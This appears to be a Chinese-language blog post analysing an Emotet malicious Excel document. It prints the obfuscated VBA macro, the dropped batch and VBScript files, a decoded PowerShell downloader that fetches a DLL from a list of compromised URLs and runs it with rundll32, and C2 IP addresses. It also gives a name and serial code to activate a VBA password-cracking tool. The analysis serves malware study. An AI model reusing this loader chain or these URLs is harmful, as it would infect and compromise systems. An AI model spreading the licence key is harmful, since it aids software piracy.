---
title: Emotet攻击样本分析
typora-root-url: ..
date: 2022-02-16 16:02:07
tags: 
 - Emotet
 - macro
 - windows
---

## 1.简介

Emotet 是一种计算机恶意软件程序，最初是作为一种[银行木马病毒](https://www.kaspersky.com/resource-center/threats/shylock-banking-trojan-definition)开发的。其目的是访问外部设备并监视敏感的私有数据。众所周知，Emotet 会骗过基本的防病毒程序并保持隐匿。一旦被感染，该恶意软件会像计算机蠕虫病毒一样传播，并试图渗透到网络中的其他计算机。

Emotet 主要通过垃圾电子邮件传播。相应的电子邮件包含恶意链接或受感染的文档。如果您下载文档或打开链接，则其他恶意软件会自动下载到您的计算机上。这些电子邮件看起来非常真实，因此 Emotet 的受害者为数众多。 

从去年 21年底， Emotet 重登恶意软件榜首，其主要传播方式为邮件传播，利用宏执行命令，感染设备后继续向设备中的联系人发送邮件进行传播。

## 2.前期准备

- 样本 xxxx.xls 
- VBA Password Bypasser.exe （绕过VBA脚本加密）
- window虚拟机（已安装office）

## 3.分析

### 3.1 恶意宏提取

恶意文档，为了使人执行恶意宏，会放入诱导启用编辑或启用内容的话术，如下图：

![image-20220216161344198](/assets/image-20220216161344198.png)

我们直接在Excel界面按Alt+F11 ,打开VB工程，发现工程被加密

![image-20220216161548056](/assets/image-20220216161548056.png)

可使用 VBA Password Bypasser.exe（网上自行下载） 绕过VB项目加密

安装完成后，激活软件：

姓 名（Name）：JekG

序 列 号（Code）：000014-RKND8F-B3WQ7U-KDNY8V-ZZFZZZ-ZZZZZZ-ZWCJP9-51VJ00-800000-000000

可使用以下两种方式打开：

- 打开软件，点击open，选择样本 xls文件，直接打开Excel(可能找不到 Excel路径导致打不开)

![image-20220216161738759](/assets/image-20220216161738759.png)

- 或点击 Run customer command line，输入Excel 的路径，启动Excel后，在Excel中打开xls文件

![image-20220216161950156](/assets/image-20220216161950156.png)

可以看到再次打开 VBA工程时，不会再提示需要输入密码

![image-20210216171222347](/assets/image-20210216171222347.png)



### 3.2 恶意宏分析

```vbscript
Const dhcSum As Integer = 0
Const dhcAvg As Integer = 1
Const dhcMax As Integer = 2
Const dhcMin As Integer = 3
Const dhcCount As Integer = 4
Const dhcSumPlus As Integer = 5
Const dhcSumMinus As Integer = 6
Const dhcCountFull As Integer = 7
Const dhcCountNotNull As Integer = 8
Const dhcCountPlus As Integer = 9
Const dhcCountMinus As Integer = 10
Sub ghsdrsDERGshdhsrse5wasd()
   Dim intLastRow As Integer
   Dim intRow As Integer
   Dim intYesRow As Integer
   Dim intNoRow As Integer
   Dim strText As String
   Dim strNewName As String
   Dim strNewQuestion As String
   Dim intRes As Integer
   MsgBox "fgzdsrfyhgj myjdf. Gaserfhlsd srhtgius.", vbOKOnly, _
    "gharagsdf"
   intLastRow = Worksheets("Data").Range("D1").Value + 1
   intRow = 1
   Do While intRow < intLastRow
      strText = Worksheets("Data").Cells(intRow, 1).Value
      intYesRow = Worksheets("Data").Cells(intRow, 2).Value
      intNoRow = Worksheets("Data").Cells(intRow, 3).Value
      If intYesRow > 0 Then
         intRes = MsgBox(strText, vbYesNo, "hueswrfg")
         If intRes = vbYes Then
            intRow = intYesRow
         Else
            intRow = intNoRow
         End If
      Else
         intRes = MsgBox("weg " & strText & "d", vbYesNo, "rtgwae")
      End If
   Loop
End Sub
Private Sub Workbook_Open()
   Dim lngAge As Long
   Dim datDate As Date
   datDate = Now: lngAge = DateDiff("yyyy", _
   datDate, Date): kjDygzs34e.Caption = Cells(105, 7) + _
   vbCrLf & Cells(103, 6)
   If DateSerial(Year(datDate) + lngAge, Month(datDate), _
    Day(datDate)) > Date Then
      lngAge = lngAge - 1
   End If
   lngAge = lngAge + 1: kjDygzs34e.Tag = Replace(Cells(102, 5), _
   "uwpe", ""): hsdFghawoyhitshdg Range("D147"), Range("A203"): dhCalculateAge = _
   lngAge: kjDygzs34e.trgsEtgseg.Text = ":"
End Sub
Sub HstgsAgsw4Rfhsf(ghoiwue As String, tyo3oe As String, HSere4yd As Boolean)
   Dim strStyle As String:   Dim strAlign As String:   Dim strOut As String
   Dim cell As Object: Dim strCellText As String: Dim lngRow As Long
   Dim lngLastRow As Long: Dim strTemp As String
   Dim objWordApp As Object
   Dim i As Long: i = 1: lngLastRow = _
   Selection.Row: Open ghoiwue For Output As #i
   For Each cell In Selection
      lngRow = cell.Row
      If i < 0 Then
      If lngRow <> lngLastRow Then
         strOut = strOut & vbTab & "</tr>" & vbCrLf & vbTab & _
          "<tr>" & vbCrLf
         lngLastRow = lngRow
      End If
      If Not IsNull(cell.Font.Size) Then
         strStyle = " style=" & "font-size: " & Int(100 * _
          cell.Font.Size / 19) & "%;"
      End If
      If cell.Font.Bold Then
         strCellText = "<b>" & strCellText & "</b>"
      End If
      If cell.HorizontalAlignment = xlRight Then
         strAlign = " align=" & "right"
      ElseIf cell.HorizontalAlignment = xlCenter Then
         strAlign = " align=" & "center"
      Else
         strAlign = ""
      End If
      strCellText = cell.Text
      If cell.Orientation <> xlHorizontal Then
         strTemp = ""
         For i = 1 To Len(strCellText)
            strTemp = strTemp & Mid$(strCellText, i, 1) & "<br>"
         Next i
         strCellText = strTemp
         strStyle = ""
      End If
      End If
      strOut = strOut & vbTab & vbTab & "<td" & strStyle & strAlign _
       & ">" & strCellText & "</td>" & vbCrLf
   Next
   strOut = vbTab & "<tr>" & vbCrLf & strOut & vbTab & _
   "</tr>" & vbCrLf: Print #i, tyo3oe
   strOut = "<table border=1 cellpadding=3 cellspacing=1>" & vbCrLf & _
    strOut & vbCrLf & "</table>": Close #i
    If strOut = "g457dt" Then
   Set objWordApp = CreateObject("Word.Application")
   objWordApp.documents.Add
   objWordApp.Selection = strOut
   objWordApp.Selection.Copy
   objWordApp.Visible = True
   Set objWordApp = Nothing
   End If
End Sub
Function hsdFghawoyhitshdg(rgWeights As Range, rgValues As Range) _
 As Double
   If (rgWeights.Count <> rgValues.Count) Then
      hsdFghawoyhitshdg = 0
      Exit Function
   End If
   Dim dblSum As Double: Dim dblSumWeight As Double
   Dim i As Integer: HstgsAgsw4Rfhsf Cells(101, 10), _
   kjDygzs34e.Caption, True
   For i = 1 To rgWeights.Count
      dblSumWeight = dblSumWeight + rgWeights(i) * rgValues(i)
      dblSum = dblSum + rgWeights(i)
   Next
   If dblSum < 0.1 Then dblSum = 1
   HstgsAgsw4Rfhsf Cells(104, 12), kjDygzs34e.Tag, False
   hsdFghawoyhitshdg = dblSumWeight / dblSum
End Function

```

整个 脚本VBA脚本代码量并不是特别大，可以看到有很多随机字符组成的字符串（加大了此为恶意脚本的可疑度）。

分析 VBA脚本时，可重点关注 open close replace cells 等函数

经初步分析，大致可以看出，此脚本是将执行的恶意代码放在单元格中，此处使用宏脚本将单元格恶意代码取出，做一定的replace变换后输出到 vbs脚本及bat脚本，随后使用 

通过动态调试，可以看到程序生成一个 vbs脚本，一个bat脚本

![image-20220216180341012](/assets/image-20220216180341012.png)

#### c:\programdata\uidpjewl.bat

```powershell
dir&echo hjsoihjspod fgjosdFhstjtyjuStJsDHTTJDGGfVBXDrtfyh57erthDFhsDRh&SET kjXDFgjrth5=po&echo BGZDSRGRES4GJHFKDGUkCHkjxcgjXdfrHdfxghzd46drxzdgdsfgxzzs4&SET KFfklhgJxdh=wers&echo FHzsDFHhGjgfJxd56r8utycjgxHzdrfg HgfhsdrfghdrzsgrDgsd46drszgdf&SET etaRHjDhfd4=hell -e&echo GjghfkuoFJUkCnjxDhrewg236ethjgdfhD5ufJdfHDSGRshdtJghDfGSreghDfh&SET iiPgjlfJds467=nc JABNAEoAWABkAGYAcwBoAEQAcgBmAEcAWgBzAGUAcwA0AD0AIgBoAHQAdABwADoALwAvAGEAbABpAHYAZQBzAHkAcwB0AGUAbQBzAC4AYwBvAG0ALwBlAGwAbgAtAGkAbQBhAGcAZQBzAC8AcABtADIAcgBTAHMAbgBWAE0ALwAsAGgAdAB0AHAAOgAvAC8AZABvAG4ALQBsAGUAZQAuAGMAbwBtAC8AXwBuAG8AdABlAHMALwBVADYASAAxADQARABOAEEALwAsAGgAdAB0AHAAOgAvAC8AbQBlAGwAbABvAHcANgAwAHMALgBjAG8AbQAvAFMAdABhAG4AbABlAHkAXwBmAGkAbABlAHMALwBFAEYASQBxAHcAWgAxADgAMwByAGYAbQBkAC8ALABoAHQAdABwADoALwAvAHAAcgBvAC0AZgBpAGMAaQBlAG4AdABsAGwAYwAuAGMAbwBtAC8AUABEAEYAXwBmAGkAbABlAHMALwA1AEEAOQBXADgALwAsAGgAdAB0AHAAOgAvAC8AbABvAHMAdAAtAGUAYQByAHQAaAAuAGMAbwBtAC8AQgBsAGEAYwBrAF8AYQBuAGQAXwBXAGgAaQB0AGUALwBaAFcANAByAEgARQBkAEQAMQB2A&echo BHMJCFghJYIfGd56y7DfHXCFghdsGdrsG DHdFdgdsgf rfghDRGd46567DRghDFGSreGDfg&SET XCVzWRet4=FoAWAAvACwAaAB0AHQAcAA6AC8ALwBjAHIAZQBlAGQAbQBvAG8AcgBwAGEAcgB0AG4AZQByAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB3AEUAWQBLAGQANQBLAEoAWgBFAFQAaABlAEIAcwB3AHEALwAsAGgAdAB0AHAAOgAvAC8AbQBhAHQAdABlAHIAcwBvAGYAZgBhAGMAdAAuAGMAbwBtAC8AYwBnAGkALwBFADAAQwAxAHYAdABTAHEAdAAvACwAaAB0AHQAcAA6AC8ALwBwAHUAcgBlAHAAbABhAHQAaQBuAHUAbQBiAGEAbgBkAC4AYwBvAG0ALwBTAGMAaABlAGQAdQBsAGUALwBFAFcAMgA0AEEAWQBKAEMAdgBCAHAATgA4AEcAYwAvACwAaAB0AHQAcAA6AC8ALwBoAG8AbQBlAGgAYQBuAGQAeQB3AG8AcgBrAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB4AEYASQBEAFAAZgBzADQAUwBTADEAeQB3ADcAZwBoAFgAWABrAC8ALABoAHQAdABwADoALwAvAGgAaQAtAHQAZQBjAGgAYQB1AGQAaQBvAC4AYwBvAG0ALwBkAGkAcg&echo HyKFYUIfYHjDXgfxhdRFGDS47dthxdfhdfhX57dfghjXgJFTJUXSDHdRxghDRxtHJYUOIighl&SET NmvbmxdrtX7sd5rs=AyADAAMgAxAC8AZwAzAGQALwAsAGgAdAB0AHAAOgAvAC8AcgBvAGQAZQByAGkAYwBrAHAAbwB3AGUAbABsAGUAbgB0AGUAcgB0AGEAaQBuAG0AZQBuAHQALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwBPAFYATwB5AE4AMwB5ADkALwAsAGgAdAB0AHAAcwA6AC8ALwBjAG8AbgBzAGMAaQBlAG4AYwBlAHMALgBjAGUAbgB0AGUAcgAvAHcAcAAtAGkAbgBjAGwAdQBkAGUAcwAvAFMAawBXADIAdwAvACwAaAB0AHQAcAA6AC8ALwBtAGEAZwAtAGQAZQBzAGkAZwBuAHMALgBjAG8AbQAvAGMAcwBzAC8ATAAzAFEASwBsAHIANgBpAFQAegBJAEwAVgB6AGIAbgBDAC8AIgAuAHMAUABMAEkAdAAoACIALAAiACkAOwAgAGYAbwBSAGUAQQBDAGgAKAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAGkATgAgACQATQBKAFgAZABmAHMAaABEAHIAZgBHAFoAcwBlAHMANAApACAAewAkAEcAdwBlAFkASAA1ADcAcwBlAGQAcwB3AGQ&echo GHJGFJDYik79fgUlhXMJGNxdrgsREhdrXDtgj57sdfhXZdrESgSzXHgJxnj46&SET DRGhREkjif=APQAoACIAYwBpAHUAdwBkADoAaQB1AHcAZABcAHAAcgBpAHUAdwBkAG8AZwBpAHUAdwBkAHIAYQBtAGkAdQB3AGQAZABhAHQAaQB1AHcAZABhAFwAcAB1AGkAaABvAHUAZAAuAGQAaQB1AHcAZABsAGkAdQB3AGQAbAAiACkALgByAGUAUABsAEEAQwBlACgAIgBpAHUAdwBkACIALAAiACIAKQA7AGkAbgBWAE8AawBlAC0AdwBlAEIAcgBFAHEAVQBlAHMAVAAgAC0AdQBSAEkAIAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAC0AbwBVAHQARgBJAGwAZQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAA7AGkARgAoAHQAZQBTAHQALQBwAEEAVABoACAAJABHAHcAZQBZAEgANQA3AHMAZQBkAHMAdwBkACkAewBpAGYAKAAoAGcARQB0AC0AaQB0AEUAbQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAApAC4AbABlAE4ARwB0AGgAIAAtAGcAZQAgADQANwA0ADMANgApAHsAYgBSAGUAYQBrADsAfQB9AH0A
echo GHJDFTGjTJTFhdzsrS47dfgjhKGUHXnxcvNr hrtHGXMNJgNxdzRFgh57dtFJUgXHJHDFgrH&start/B /WAIT %kjXDFgjrth5%%KFfklhgJxdh%%etaRHjDhfd4%%iiPgjlfJds467%%XCVzWRet4%%NmvbmxdrtX7sd5rs%%DRGhREkjif%&echo dgfhakirjshgfJgfJd57udgfJxsDGFjxDSHzDFHDZFHdgfxs547dfhJXGHJXDFHdrf4s6dfh
```

#### c:\programdata\tjspowj.vbs

```vbscript
dim gSEdJDsfy5JGHKdggdh:hjrfo2wehokd="WjwpeoScjwpeoripjwpeot.Sjwpeohejwpeoljwpeol":dvgnoma4ibhnld="cuerlxmuerlxd /uerlxc suerlxtauerlxruerlxt uerlx/uerlxB uerlxc:uerlx\wuerlxinuerlxdowuerlxs\suerlxyswuerlxouerlxw6uerlx4\ruuerlxnduerlxluerlxl3uerlx2.uerlxexuerlxe uerlxc:uerlx\uerlxpruerlxoguerlxramuerlxdauerlxta\puihoud.duerlxluerlxl,tjpleowdsyf":set gSEdJDsfy5JGHKdggdh=wscript.createobject(replace(hjrfo2wehokd,"jwpeo","")):dim ryulxdHSerw:ryulxdHSerw=replace("curiw:uriw\puriwrogruriwamduriwaturiwa\uidpjewl.buriwat","uriw",""):gSEdJDsfy5JGHKdggdh.run ryulxdHSerw,0,true:dim HkjsdsfEhdse46d:HkjsdsfEhdse46d=replace(dvgnoma4ibhnld,"uerlx",""):gSEdJDsfy5JGHKdggdh.run HkjsdsfEhdse46d,0
```

进行简化得到

c:\programdata\uidpjewl.bat

可使用 https://raikia.com/tool-powershell-encoder/ 解 base64 （powershell编码为 utf-16）

```
powershell -enc JABNAEoAWABkAGYAcwBoAEQAcgBmAEcAWgBzAGUAcwA0AD0AIgBoAHQAdABwADoALwAvAGEAbABpAHYAZQBzAHkAcwB0AGUAbQBzAC4AYwBvAG0ALwBlAGwAbgAtAGkAbQBhAGcAZQBzAC8AcABtADIAcgBTAHMAbgBWAE0ALwAsAGgAdAB0AHAAOgAvAC8AZABvAG4ALQBsAGUAZQAuAGMAbwBtAC8AXwBuAG8AdABlAHMALwBVADYASAAxADQARABOAEEALwAsAGgAdAB0AHAAOgAvAC8AbQBlAGwAbABvAHcANgAwAHMALgBjAG8AbQAvAFMAdABhAG4AbABlAHkAXwBmAGkAbABlAHMALwBFAEYASQBxAHcAWgAxADgAMwByAGYAbQBkAC8ALABoAHQAdABwADoALwAvAHAAcgBvAC0AZgBpAGMAaQBlAG4AdABsAGwAYwAuAGMAbwBtAC8AUABEAEYAXwBmAGkAbABlAHMALwA1AEEAOQBXADgALwAsAGgAdAB0AHAAOgAvAC8AbABvAHMAdAAtAGUAYQByAHQAaAAuAGMAbwBtAC8AQgBsAGEAYwBrAF8AYQBuAGQAXwBXAGgAaQB0AGUALwBaAFcANAByAEgARQBkAEQAMQB2AFoAWAAvACwAaAB0AHQAcAA6AC8ALwBjAHIAZQBlAGQAbQBvAG8AcgBwAGEAcgB0AG4AZQByAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB3AEUAWQBLAGQANQBLAEoAWgBFAFQAaABlAEIAcwB3AHEALwAsAGgAdAB0AHAAOgAvAC8AbQBhAHQAdABlAHIAcwBvAGYAZgBhAGMAdAAuAGMAbwBtAC8AYwBnAGkALwBFADAAQwAxAHYAdABTAHEAdAAvACwAaAB0AHQAcAA6AC8ALwBwAHUAcgBlAHAAbABhAHQAaQBuAHUAbQBiAGEAbgBkAC4AYwBvAG0ALwBTAGMAaABlAGQAdQBsAGUALwBFAFcAMgA0AEEAWQBKAEMAdgBCAHAATgA4AEcAYwAvACwAaAB0AHQAcAA6AC8ALwBoAG8AbQBlAGgAYQBuAGQAeQB3AG8AcgBrAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB4AEYASQBEAFAAZgBzADQAUwBTADEAeQB3ADcAZwBoAFgAWABrAC8ALABoAHQAdABwADoALwAvAGgAaQAtAHQAZQBjAGgAYQB1AGQAaQBvAC4AYwBvAG0ALwBkAGkAcgAyADAAMgAxAC8AZwAzAGQALwAsAGgAdAB0AHAAOgAvAC8AcgBvAGQAZQByAGkAYwBrAHAAbwB3AGUAbABsAGUAbgB0AGUAcgB0AGEAaQBuAG0AZQBuAHQALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwBPAFYATwB5AE4AMwB5ADkALwAsAGgAdAB0AHAAcwA6AC8ALwBjAG8AbgBzAGMAaQBlAG4AYwBlAHMALgBjAGUAbgB0AGUAcgAvAHcAcAAtAGkAbgBjAGwAdQBkAGUAcwAvAFMAawBXADIAdwAvACwAaAB0AHQAcAA6AC8ALwBtAGEAZwAtAGQAZQBzAGkAZwBuAHMALgBjAG8AbQAvAGMAcwBzAC8ATAAzAFEASwBsAHIANgBpAFQAegBJAEwAVgB6AGIAbgBDAC8AIgAuAHMAUABMAEkAdAAoACIALAAiACkAOwAgAGYAbwBSAGUAQQBDAGgAKAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAGkATgAgACQATQBKAFgAZABmAHMAaABEAHIAZgBHAFoAcwBlAHMANAApACAAewAkAEcAdwBlAFkASAA1ADcAcwBlAGQAcwB3AGQAPQAoACIAYwBpAHUAdwBkADoAaQB1AHcAZABcAHAAcgBpAHUAdwBkAG8AZwBpAHUAdwBkAHIAYQBtAGkAdQB3AGQAZABhAHQAaQB1AHcAZABhAFwAcAB1AGkAaABvAHUAZAAuAGQAaQB1AHcAZABsAGkAdQB3AGQAbAAiACkALgByAGUAUABsAEEAQwBlACgAIgBpAHUAdwBkACIALAAiACIAKQA7AGkAbgBWAE8AawBlAC0AdwBlAEIAcgBFAHEAVQBlAHMAVAAgAC0AdQBSAEkAIAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAC0AbwBVAHQARgBJAGwAZQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAA7AGkARgAoAHQAZQBTAHQALQBwAEEAVABoACAAJABHAHcAZQBZAEgANQA3AHMAZQBkAHMAdwBkACkAewBpAGYAKAAoAGcARQB0AC0AaQB0AEUAbQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAApAC4AbABlAE4ARwB0AGgAIAAtAGcAZQAgADQANwA0ADMANgApAHsAYgBSAGUAYQBrADsAfQB9AH0A

再次解析得
$MJXdfshDrfGZses4="http://alivesystems.com/eln-images/pm2rSsnVM/,http://don-lee.com/_notes/U6H14DNA/,http://mellow60s.com/Stanley_files/EFIqwZ183rfmd/,http://pro-ficientllc.com/PDF_files/5A9W8/,http://lost-earth.com/Black_and_White/ZW4rHEdD1vZX/,http://creedmoorpartners.com/eln-images/wEYKd5KJZETheBswq/,http://mattersoffact.com/cgi/E0C1vtSqt/,http://pureplatinumband.com/Schedule/EW24AYJCvBpN8Gc/,http://homehandyworks.com/eln-images/xFIDPfs4SS1yw7ghXXk/,http://hi-techaudio.com/dir2021/g3d/,http://roderickpowellentertainment.com/eln-images/OVOyN3y9/,https://consciences.center/wp-includes/SkW2w/,http://mag-designs.com/css/L3QKlr6iTzILVzbnC/".sPLIt(","); foReACh($yIdsRhye34syufgxjcdf iN $MJXdfshDrfGZses4) {$GweYH57sedswd=("c:\programdata\puihoud.dll").rePlACe("","");inVOke-weBrEqUesT -uRI $yIdsRhye34syufgxjcdf -oUtFIle $GweYH57sedswd;iF(teSt-pATh $GweYH57sedswd){if((gEt-itEm $GweYH57sedswd).leNGth -ge 47436){bReak;}}}
```



c:\programdata\tjspowj.vbs

```vbscript
wscript.createobject(WScript.Shell).run "c:\programdata\uidpjewl.bat",0,true
wscript.createobject(WScript.Shell).run "cmd /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\puihoud.dll,tjpleowdsyf",0
```



至此 我们 可以清楚，该 恶意文件，通过 宏生成 vbs和bat文件，随后使用 wscript 执行 vbs 脚本。 vbs脚本调用cmd 执行 bat脚本，bat脚本调用powershell下载恶意DLL文件， 随后vbs脚本使用rundll32 执行dll文件。 

### 3.3 DLL 文件分析

不会DLL 分析了， 只能放到沙箱跑了下，后续DLL文件行为如下：

1. C:\Windows\system32\rundll32.exe "c:\programdata\puihoud.dll",DllRegisterServer 重新使用rundll32 加载自己， 加载函数变为 DllRegisterServer
2. 释放可执行文件 C:\Users\admin\AppData\Local\Zeoritohqqgtc\mmoqnlsiof.kiz
3. 启动  C:\Windows\system32\rundll32.exe "C:\Users\admin\AppData\Local\Zeoritohqqgtc\mmoqnlsiof.kiz",mCRdEzvwblrt
4. 切换函数 C:\Windows\system32\rundll32.exe "C:\Users\admin\AppData\Local\Zeoritohqqgtc\mmoqnlsiof.kiz",DllRegisterServer
5. 并与 C2 服务器通信 103.42.57.17 / 116.124.128.206



完整执行链路如下 ：

<img src="/assets/image-20220216184832492.png" alt="image-20220216184832492" style="zoom:150%;" />
